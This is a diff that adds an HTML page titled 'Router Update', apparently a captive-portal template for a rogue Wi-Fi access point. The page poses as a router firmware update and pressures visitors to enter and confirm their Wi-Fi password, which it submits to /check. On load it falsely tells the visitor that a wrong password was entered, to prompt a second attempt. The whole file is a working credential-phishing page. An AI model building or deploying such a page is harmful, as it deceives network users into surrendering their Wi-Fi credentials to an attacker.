@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    	<title>Router Update</title>
+        <script>
+            function validate() {
+                var pwd = document.getElementById('pwd').value;
+                var pwd2 = document.getElementById('pwd2').value;
+                if(pwd === pwd2) {
+                    document.getElementById('fwupdate').submit();
+                } else {
+                    alert("Passwords do not match");
+                    document.getElementById('fwupdate').reset();
+                }
+            }
+        </script>
+        <style>
+            body {
+                background-color: lightgray;
+            }
+            h1 {
+                text-align: center;
+            }
+            h3 {
+                text-align: center;
+                color: red
+            }
+            p {
+                text-align: center;
+                background-color:lightcoral;
+                display: block;
+                margin: 20px 50px;
+                padding-top: 25px;
+                padding-bottom: 25px;
+            }
+            form {
+                width: 280px;
+                position: relative;
+                align-content: center;
+                justify-content: center;
+                margin: auto auto;
+                padding: 10px 10px;
+                text-align: center;
+            }
+            input, button {
+                position: relative;
+                width: 250px;
+                margin-left: 15px;
+                box-sizing: border-box;
+                margin-top: 5px;
+                margin-bottom: 5px;
+            }
+        </style>
+    </head>
+    <body onload="document.getElementById('fwupdate').reset();alert('Wrong password entered!');">
+        <h1>FIRMWARE UPDATE</h1><hr>
+        <p>Firmware update will protect your router from modern cyber attacks<br>Firmware update will provides new security features<br>Process might take upto 5 minutes<br>During this process you will lose network connection</p>
+        <h3>Please enter the Wi-Fi password to update router firmware</h3>
+        <form id="fwupdate" action="/check" method="POST">
+            <label>Password</label><br>
+            <input type="password" name="pwd" id="pwd" required><br>
+            <label>Comfirm Password</label><br>
+            <input type="password" id="pwd2" required><br>
+            <button onClick="validate()">Submit</button>
+        </form>
+    </body>
+</html>
